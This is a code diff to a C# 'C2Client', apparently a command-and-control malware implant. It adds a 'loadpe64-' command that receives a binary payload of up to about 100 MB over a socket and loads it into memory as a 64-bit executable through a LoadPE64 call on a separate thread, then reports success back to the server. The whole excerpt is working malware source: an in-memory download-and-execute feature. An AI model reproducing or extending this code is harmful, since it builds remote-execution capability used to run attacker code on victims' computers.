@@ -1425,6 +1425,29 @@ namespace C2Client
                         catch { }
                     }
 
+
+                    else if (cmd.Contains("loadpe64-"))
+                    {
+
+                        byte[] payload = new byte[102400000];
+                        Array.Clear(payload, 0, payload.Length);
+
+                        cs.Receive(payload);
+
+                        try
+                        {
+                            Thread pe64loader = new Thread(() =>
+                            {
+                                winapi.LoadPE64(payload);
+                            });
+                            pe64loader.Start();
+                            
+                        }
+                        catch { }
+                        cmd = "Loaded successfully";
+
+                    }
+
                     else
                     {
                         Program p = new Program();
